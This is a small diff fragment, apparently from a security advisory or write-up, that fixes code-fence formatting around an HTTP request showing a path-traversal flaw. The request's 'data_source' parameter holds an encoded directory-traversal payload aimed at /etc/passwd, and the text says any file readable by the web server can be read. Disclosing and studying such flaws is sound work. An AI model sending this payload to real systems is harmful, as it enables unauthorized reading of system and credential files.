@@ -120,7 +120,8 @@ can read any file readable by the web server, including /etc/passwd,
   Priority: u=0, i\
   Te: trailers\
   \
-  data_source=\....%2F%2F\....%2F%2F\....%2F%2Fetc%2Fpasswd```
+  data_source=\....%2F%2F\....%2F%2F\....%2F%2Fetc%2Fpasswd
+```
   -----------------------------------------------------------------------
 
   -----------------------------------------------------------------------
